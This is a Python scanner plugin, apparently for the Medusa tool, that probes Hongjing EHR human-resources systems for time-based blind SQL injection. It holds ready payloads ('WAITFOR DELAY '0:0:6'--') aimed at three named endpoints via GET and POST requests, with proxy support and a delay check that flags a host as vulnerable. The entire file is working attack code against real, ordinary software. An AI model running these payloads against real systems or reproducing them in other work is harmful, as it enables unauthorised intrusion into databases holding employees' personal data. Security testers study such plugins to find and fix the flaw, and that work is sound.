#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 宏景EHR系统多处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2014-075122
author: Lucifer
description: 1.由于/pos/posbusiness/train_get_code_tree.jsp页面参数codesetid未安全过滤导致SQL延时注射漏洞
             2.由于/servlet/sys/option/customreport/tree页面参数id未安全过滤导致SQL延时注射漏洞
             3.由于/system/report_orgtree.jsp页面参数report_type未安全过滤导致SQL延时注射漏洞
'''
import urllib
import requests
import time
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payloads = ["/pos/posbusiness/train_get_code_tree.jsp?codesetid=1%27%20WAITFOR%20DELAY%20%270:0:6%27--",
            "/system/report_orgtree.jsp?unitcode=3&report_type=1%20WAITFOR%20DELAY%20%270:0:6%27--"]
post_url =  "/servlet/sys/option/customreport/tree"
post_data = {
    "id": "' WAITFOR DELAY '0:0:6'--",
    "codeset": "null",
    "method": "tree",
    "priv": "undefined",
    "level": "undefined",
    "node": "3"
}
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        for payload in payloads:
            payload_url = scheme+"://"+url+payload
            post_url = scheme+"://"+url+"/servlet/sys/option/customreport/tree"
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            start_time = time.time()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }

                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
                resp2 =requests.post(post_url, headers=headers, data=post_data,proxies=proxies, timeout=10, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
                resp2=requests.post(post_url, headers=headers, data=post_data, timeout=10, verify=False)
            con = resp.text
            code = resp.status_code
            if time.time() - start_time >= 6:
                Medusa = "{} 存在宏景EHR系统 SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                return (Medusa)
    except Exception as e:
        pass